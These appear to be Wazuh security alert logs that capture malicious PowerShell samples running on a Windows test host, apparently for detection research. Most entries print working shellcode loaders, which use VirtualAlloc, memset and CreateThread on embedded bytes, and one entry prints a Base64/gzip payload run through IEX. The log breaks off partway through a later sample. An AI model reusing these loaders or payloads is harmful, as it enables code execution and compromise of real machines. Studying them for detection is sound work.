{"timestamp":"2026-07-14T07:54:11.317+0000","rule":{"level":10,"description":"Powershell script may be executing suspicious code with CreateThread API","id":"91810","mitre":{"id":["T1106"],"tactic":["Execution"],"technique":["Native API"]},"firedtimes":45,"mail":false,"groups":["windows"," powershell"]},"agent":{"id":"002","name":"DESKTOP-BAC9DBQ","ip":"192.168.1.12"},"manager":{"name":"wazuh-server"},"id":"1784015651.709670","decoder":{"name":"windows_eventchannel"},"data":{"win":{"system":{"providerName":"Microsoft-Windows-PowerShell","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","eventID":"4104","version":"1","level":"3","task":"2","opcode":"15","keywords":"0x0","systemTime":"2026-07-14T07:54:41.6368501Z","eventRecordID":"201003","processID":"2560","threadID":"10032","channel":"Microsoft-Windows-PowerShell/Operational","computer":"DESKTOP-BAC9DBQ","severityValue":"WARNING","message":"\"Creating Scriptblock text (1 of 1):\r\n$R9Un = '[DllImport(\"kernel32.dll\")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(\"kernel32.dll\")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(\"msvcrt.dll\")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $R9Un -Name \"Win32\" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xbd,0x22,0xd0,0x4b,0x2f,0xda,0xd4,0xd9,0x74,0x24,0xf4,0x5a,0x31,0xc9,0xb1,0x47,0x31,0x6a,0x13,0x03,0x6a,0x13,0x83,0xc2,0x26,0x32,0xbe,0xd3,0xce,0x30,0x41,0x2c,0x0e,0x55,0xcb,0xc9,0x3f,0x55,0xaf,0x9a,0x6f,0x65,0xbb,0xcf,0x83,0x0e,0xe9,0xfb,0x10,0x62,0x26,0x0b,0x91,0xc9,0x10,0x22,0x22,0x61,0x60,0x25,0xa0,0x78,0xb5,0x85,0x99,0xb2,0xc8,0xc4,0xde,0xaf,0x21,0x94,0xb7,0xa4,0x94,0x09,0xbc,0xf1,0x24,0xa1,0x8e,0x14,0x2d,0x56,0x46,0x16,0x1c,0xc9,0xdd,0x41,0xbe,0xeb,0x32,0xfa,0xf7,0xf3,0x57,0xc7,0x4e,0x8f,0xa3,0xb3,0x50,0x59,0xfa,0x3c,0xfe,0xa4,0x33,0xcf,0xfe,0xe1,0xf3,0x30,0x75,0x18,0x00,0xcc,0x8e,0xdf,0x7b,0x0a,0x1a,0xc4,0xdb,0xd9,0xbc,0x20,0xda,0x0e,0x5a,0xa2,0xd0,0xfb,0x28,0xec,0xf4,0xfa,0xfd,0x86,0x00,0x76,0x00,0x49,0x81,0xcc,0x27,0x4d,0xca,0x97,0x46,0xd4,0xb6,0x76,0x76,0x06,0x19,0x26,0xd2,0x4c,0xb7,0x33,0x6f,0x0f,0xdf,0xf0,0x42,0xb0,0x1f,0x9f,0xd5,0xc3,0x2d,0x00,0x4e,0x4c,0x1d,0xc9,0x48,0x8b,0x62,0xe0,0x2d,0x03,0x9d,0x0b,0x4e,0x0d,0x59,0x5f,0x1e,0x25,0x48,0xe0,0xf5,0xb5,0x75,0x35,0x63,0xb3,0xe1,0x76,0xdc,0xac,0x72,0x1e,0x1f,0xd3,0x75,0x64,0x96,0x35,0x25,0xca,0xf9,0xe9,0x85,0xba,0xb9,0x59,0x6d,0xd1,0x35,0x85,0x8d,0xda,0x9f,0xae,0x27,0x35,0x76,0x86,0xdf,0xac,0xd3,0x5c,0x7e,0x30,0xce,0x18,0x40,0xba,0xfd,0xdd,0x0e,0x4b,0x8b,0xcd,0xe6,0xbb,0xc6,0xac,0xa0,0xc4,0xfc,0xdb,0x4c,0x51,0xfb,0x4d,0x1b,0xcd,0x01,0xab,0x6b,0x52,0xf9,0x9e,0xe0,0x5b,0x6f,0x61,0x9e,0xa3,0x7f,0x61,0x5e,0xf2,0x15,0x61,0x36,0xa2,0x4d,0x32,0x23,0xad,0x5b,0x26,0xf8,0x38,0x64,0x1f,0xad,0xeb,0x0c,0x9d,0x88,0xdc,0x92,0x5e,0xff,0xdc,0xef,0x88,0x39,0xab,0x01,0x09;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$PR3=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($PR3.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$PR3,0,0,0);for (;;){Start-sleep 60};\r\n\r\nScriptBlock ID: cdcba884-81d2-4dd9-8906-0c43e1c102c7\r\nPath: C:\\TA\\project-ta\\data_spliting\\test_set\\malicious\\1784.ps1\""},"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockText":"$R9Un = '[DllImport(\\\"kernel32.dll\\\")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(\\\"kernel32.dll\\\")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(\\\"msvcrt.dll\\\")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $R9Un -Name \\\"Win32\\\" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xbd,0x22,0xd0,0x4b,0x2f,0xda,0xd4,0xd9,0x74,0x24,0xf4,0x5a,0x31,0xc9,0xb1,0x47,0x31,0x6a,0x13,0x03,0x6a,0x13,0x83,0xc2,0x26,0x32,0xbe,0xd3,0xce,0x30,0x41,0x2c,0x0e,0x55,0xcb,0xc9,0x3f,0x55,0xaf,0x9a,0x6f,0x65,0xbb,0xcf,0x83,0x0e,0xe9,0xfb,0x10,0x62,0x26,0x0b,0x91,0xc9,0x10,0x22,0x22,0x61,0x60,0x25,0xa0,0x78,0xb5,0x85,0x99,0xb2,0xc8,0xc4,0xde,0xaf,0x21,0x94,0xb7,0xa4,0x94,0x09,0xbc,0xf1,0x24,0xa1,0x8e,0x14,0x2d,0x56,0x46,0x16,0x1c,0xc9,0xdd,0x41,0xbe,0xeb,0x32,0xfa,0xf7,0xf3,0x57,0xc7,0x4e,0x8f,0xa3,0xb3,0x50,0x59,0xfa,0x3c,0xfe,0xa4,0x33,0xcf,0xfe,0xe1,0xf3,0x30,0x75,0x18,0x00,0xcc,0x8e,0xdf,0x7b,0x0a,0x1a,0xc4,0xdb,0xd9,0xbc,0x20,0xda,0x0e,0x5a,0xa2,0xd0,0xfb,0x28,0xec,0xf4,0xfa,0xfd,0x86,0x00,0x76,0x00,0x49,0x81,0xcc,0x27,0x4d,0xca,0x97,0x46,0xd4,0xb6,0x76,0x76,0x06,0x19,0x26,0xd2,0x4c,0xb7,0x33,0x6f,0x0f,0xdf,0xf0,0x42,0xb0,0x1f,0x9f,0xd5,0xc3,0x2d,0x00,0x4e,0x4c,0x1d,0xc9,0x48,0x8b,0x62,0xe0,0x2d,0x03,0x9d,0x0b,0x4e,0x0d,0x59,0x5f,0x1e,0x25,0x48,0xe0,0xf5,0xb5,0x75,0x35,0x63,0xb3,0xe1,0x76,0xdc,0xac,0x72,0x1e,0x1f,0xd3,0x75,0x64,0x96,0x35,0x25,0xca,0xf9,0xe9,0x85,0xba,0xb9,0x59,0x6d,0xd1,0x35,0x85,0x8d,0xda,0x9f,0xae,0x27,0x35,0x76,0x86,0xdf,0xac,0xd3,0x5c,0x7e,0x30,0xce,0x18,0x40,0xba,0xfd,0xdd,0x0e,0x4b,0x8b,0xcd,0xe6,0xbb,0xc6,0xac,0xa0,0xc4,0xfc,0xdb,0x4c,0x51,0xfb,0x4d,0x1b,0xcd,0x01,0xab,0x6b,0x52,0xf9,0x9e,0xe0,0x5b,0x6f,0x61,0x9e,0xa3,0x7f,0x61,0x5e,0xf2,0x15,0x61,0x36,0xa2,0x4d,0x32,0x23,0xad,0x5b,0x26,0xf8,0x38,0x64,0x1f,0xad,0xeb,0x0c,0x9d,0x88,0xdc,0x92,0x5e,0xff,0xdc,0xef,0x88,0x39,0xab,0x01,0x09;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$PR3=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($PR3.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$PR3,0,0,0);for (;;){Start-sleep 60};","scriptBlockId":"cdcba884-81d2-4dd9-8906-0c43e1c102c7","path":"C:\\\\TA\\\\project-ta\\\\data_spliting\\\\test_set\\\\malicious\\\\1784.ps1"}}},"location":"EventChannel"}
{"timestamp":"2026-07-14T07:54:12.747+0000","rule":{"level":10,"description":"Powershell script may be executing suspicious code with CreateThread API","id":"91810","mitre":{"id":["T1106"],"tactic":["Execution"],"technique":["Native API"]},"firedtimes":46,"mail":false,"groups":["windows"," powershell"]},"agent":{"id":"002","name":"DESKTOP-BAC9DBQ","ip":"192.168.1.12"},"manager":{"name":"wazuh-server"},"id":"1784015652.721028","decoder":{"name":"windows_eventchannel"},"data":{"win":{"system":{"providerName":"Microsoft-Windows-PowerShell","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","eventID":"4104","version":"1","level":"3","task":"2","opcode":"15","keywords":"0x0","systemTime":"2026-07-14T07:54:42.4133274Z","eventRecordID":"201007","processID":"8280","threadID":"7052","channel":"Microsoft-Windows-PowerShell/Operational","computer":"DESKTOP-BAC9DBQ","severityValue":"WARNING","message":"\"Creating Scriptblock text (1 of 1):\r\n$XC5E = '[DllImport(\"kernel32.dll\")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(\"kernel32.dll\")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(\"msvcrt.dll\")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $XC5E -Name \"Win32\" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xba,0x9d,0x04,0x1d,0x2c,0xda,0xc3,0xd9,0x74,0x24,0xf4,0x5d,0x29,0xc9,0xb1,0x47,0x83,0xed,0xfc,0x31,0x55,0x0f,0x03,0x55,0x92,0xe6,0xe8,0xd0,0x44,0x64,0x12,0x29,0x94,0x09,0x9a,0xcc,0xa5,0x09,0xf8,0x85,0x95,0xb9,0x8a,0xc8,0x19,0x31,0xde,0xf8,0xaa,0x37,0xf7,0x0f,0x1b,0xfd,0x21,0x21,0x9c,0xae,0x12,0x20,0x1e,0xad,0x46,0x82,0x1f,0x7e,0x9b,0xc3,0x58,0x63,0x56,0x91,0x31,0xef,0xc5,0x06,0x36,0xa5,0xd5,0xad,0x04,0x2b,0x5e,0x51,0xdc,0x4a,0x4f,0xc4,0x57,0x15,0x4f,0xe6,0xb4,0x2d,0xc6,0xf0,0xd9,0x08,0x90,0x8b,0x29,0xe6,0x23,0x5a,0x60,0x07,0x8f,0xa3,0x4d,0xfa,0xd1,0xe4,0x69,0xe5,0xa7,0x1c,0x8a,0x98,0xbf,0xda,0xf1,0x46,0x35,0xf9,0x51,0x0c,0xed,0x25,0x60,0xc1,0x68,0xad,0x6e,0xae,0xff,0xe9,0x72,0x31,0xd3,0x81,0x8e,0xba,0xd2,0x45,0x07,0xf8,0xf0,0x41,0x4c,0x5a,0x98,0xd0,0x28,0x0d,0xa5,0x03,0x93,0xf2,0x03,0x4f,0x39,0xe6,0x39,0x12,0x55,0xcb,0x73,0xad,0xa5,0x43,0x03,0xde,0x97,0xcc,0xbf,0x48,0x9b,0x85,0x19,0x8e,0xdc,0xbf,0xde,0x00,0x23,0x40,0x1f,0x08,0xe7,0x14,0x4f,0x22,0xce,0x14,0x04,0xb2,0xef,0xc0,0xb1,0xb7,0x67,0x2b,0xed,0xb9,0x13,0xc3,0xec,0xb9,0xca,0xd1,0x78,0x5f,0xbc,0x85,0x2a,0xf0,0x7c,0x76,0x8b,0xa0,0x14,0x9c,0x04,0x9e,0x04,0x9f,0xce,0xb7,0xae,0x70,0xa7,0xe0,0x46,0xe8,0xe2,0x7b,0xf7,0xf5,0x38,0x06,0x37,0x7d,0xcf,0xf6,0xf9,0x76,0xba,0xe4,0x6d,0x77,0xf1,0x57,0x3b,0x88,0x2f,0xfd,0xc3,0x1c,0xd4,0x54,0x94,0x88,0xd6,0x81,0xd2,0x16,0x28,0xe4,0x69,0x9e,0xbc,0x47,0x05,0xdf,0x50,0x48,0xd5,0x89,0x3a,0x48,0xbd,0x6d,0x1f,0x1b,0xd8,0x71,0x8a,0x0f,0x71,0xe4,0x35,0x66,0x26,0xaf,0x5d,0x84,0x11,0x87,0xc1,0x77,0x74,0x19,0x3d,0xae,0xb0,0x6f,0x2f,0x72;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$mX0=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($mX0.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$mX0,0,0,0);for (;;){Start-sleep 60};\r\n\r\nScriptBlock ID: d4c9a1b0-7116-45e8-af65-4cdd4488c4d1\r\nPath: C:\\TA\\project-ta\\data_spliting\\test_set\\malicious\\1799.ps1\""},"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockText":"$XC5E = '[DllImport(\\\"kernel32.dll\\\")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(\\\"kernel32.dll\\\")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(\\\"msvcrt.dll\\\")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $XC5E -Name \\\"Win32\\\" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xba,0x9d,0x04,0x1d,0x2c,0xda,0xc3,0xd9,0x74,0x24,0xf4,0x5d,0x29,0xc9,0xb1,0x47,0x83,0xed,0xfc,0x31,0x55,0x0f,0x03,0x55,0x92,0xe6,0xe8,0xd0,0x44,0x64,0x12,0x29,0x94,0x09,0x9a,0xcc,0xa5,0x09,0xf8,0x85,0x95,0xb9,0x8a,0xc8,0x19,0x31,0xde,0xf8,0xaa,0x37,0xf7,0x0f,0x1b,0xfd,0x21,0x21,0x9c,0xae,0x12,0x20,0x1e,0xad,0x46,0x82,0x1f,0x7e,0x9b,0xc3,0x58,0x63,0x56,0x91,0x31,0xef,0xc5,0x06,0x36,0xa5,0xd5,0xad,0x04,0x2b,0x5e,0x51,0xdc,0x4a,0x4f,0xc4,0x57,0x15,0x4f,0xe6,0xb4,0x2d,0xc6,0xf0,0xd9,0x08,0x90,0x8b,0x29,0xe6,0x23,0x5a,0x60,0x07,0x8f,0xa3,0x4d,0xfa,0xd1,0xe4,0x69,0xe5,0xa7,0x1c,0x8a,0x98,0xbf,0xda,0xf1,0x46,0x35,0xf9,0x51,0x0c,0xed,0x25,0x60,0xc1,0x68,0xad,0x6e,0xae,0xff,0xe9,0x72,0x31,0xd3,0x81,0x8e,0xba,0xd2,0x45,0x07,0xf8,0xf0,0x41,0x4c,0x5a,0x98,0xd0,0x28,0x0d,0xa5,0x03,0x93,0xf2,0x03,0x4f,0x39,0xe6,0x39,0x12,0x55,0xcb,0x73,0xad,0xa5,0x43,0x03,0xde,0x97,0xcc,0xbf,0x48,0x9b,0x85,0x19,0x8e,0xdc,0xbf,0xde,0x00,0x23,0x40,0x1f,0x08,0xe7,0x14,0x4f,0x22,0xce,0x14,0x04,0xb2,0xef,0xc0,0xb1,0xb7,0x67,0x2b,0xed,0xb9,0x13,0xc3,0xec,0xb9,0xca,0xd1,0x78,0x5f,0xbc,0x85,0x2a,0xf0,0x7c,0x76,0x8b,0xa0,0x14,0x9c,0x04,0x9e,0x04,0x9f,0xce,0xb7,0xae,0x70,0xa7,0xe0,0x46,0xe8,0xe2,0x7b,0xf7,0xf5,0x38,0x06,0x37,0x7d,0xcf,0xf6,0xf9,0x76,0xba,0xe4,0x6d,0x77,0xf1,0x57,0x3b,0x88,0x2f,0xfd,0xc3,0x1c,0xd4,0x54,0x94,0x88,0xd6,0x81,0xd2,0x16,0x28,0xe4,0x69,0x9e,0xbc,0x47,0x05,0xdf,0x50,0x48,0xd5,0x89,0x3a,0x48,0xbd,0x6d,0x1f,0x1b,0xd8,0x71,0x8a,0x0f,0x71,0xe4,0x35,0x66,0x26,0xaf,0x5d,0x84,0x11,0x87,0xc1,0x77,0x74,0x19,0x3d,0xae,0xb0,0x6f,0x2f,0x72;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$mX0=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($mX0.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$mX0,0,0,0);for (;;){Start-sleep 60};","scriptBlockId":"d4c9a1b0-7116-45e8-af65-4cdd4488c4d1","path":"C:\\\\TA\\\\project-ta\\\\data_spliting\\\\test_set\\\\malicious\\\\1799.ps1"}}},"location":"EventChannel"}
{"timestamp":"2026-07-14T07:54:14.935+0000","rule":{"level":10,"description":"Powershell script may be using Base64 decoding method","id":"91809","mitre":{"id":["T1140"],"tactic":["Defense Evasion"],"technique":["Deobfuscate/Decode Files or Information"]},"firedtimes":2,"mail":false,"groups":["windows"," powershell"]},"agent":{"id":"002","name":"DESKTOP-BAC9DBQ","ip":"192.168.1.12"},"manager":{"name":"wazuh-server"},"id":"1784015654.732384","decoder":{"name":"windows_eventchannel"},"data":{"win":{"system":{"providerName":"Microsoft-Windows-PowerShell","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","eventID":"4104","version":"1","level":"3","task":"2","opcode":"15","keywords":"0x0","systemTime":"2026-07-14T07:54:44.5646193Z","eventRecordID":"201014","processID":"11624","threadID":"4872","channel":"Microsoft-Windows-PowerShell/Operational","computer":"DESKTOP-BAC9DBQ","severityValue":"WARNING","message":"\"Creating Scriptblock text (1 of 1):\r\n$s=New-Object IO.MemoryStream(,[Convert]::FromBase64String(\"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\"));IEX (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream($s,[IO.Compression.CompressionMode]::Decompress))).ReadToEnd();\r\n\r\nScriptBlock ID: 7e0d95ff-885d-4a25-a324-40feaf8f32af\r\nPath: C:\\TA\\project-ta\\data_spliting\\test_set\\malicious\\1811.ps1\""},"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockText":"$s=New-Object IO.MemoryStream(,[Convert]::FromBase64String(\\\"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\\\"));IEX (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream($s,[IO.Compression.CompressionMode]::Decompress))).ReadToEnd();","scriptBlockId":"7e0d95ff-885d-4a25-a324-40feaf8f32af","path":"C:\\\\TA\\\\project-ta\\\\data_spliting\\\\test_set\\\\malicious\\\\1811.ps1"}}},"location":"EventChannel"}
{"timestamp":"2026-07-14T07:54:16.555+0000","rule":{"level":10,"description":"Powershell script may be executing suspicious code with CreateThread API","id":"91810","mitre":{"id":["T1106"],"tactic":["Execution"],"technique":["Native API"]},"firedtimes":47,"mail":false,"groups":["windows"," powershell"]},"agent":{"id":"002","name":"DESKTOP-BAC9DBQ","ip":"192.168.1.12"},"manager":{"name":"wazuh-server"},"id":"1784015656.743513","decoder":{"name":"windows_eventchannel"},"data":{"win":{"system":{"providerName":"Microsoft-Windows-PowerShell","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","eventID":"4104","version":"1","level":"3","task":"2","opcode":"15","keywords":"0x0","systemTime":"2026-07-14T07:54:46.3073196Z","eventRecordID":"201021","processID":"11668","threadID":"12184","channel":"Microsoft-Windows-PowerShell/Operational","computer":"DESKTOP-BAC9DBQ","severityValue":"WARNING","message":"\"Creating Scriptblock text (1 of 1):\r\n$c = '[DllImport(\"kernel32.dll\")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(\"kernel32.dll\")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(\"msvcrt.dll\")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name \"Win32\" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 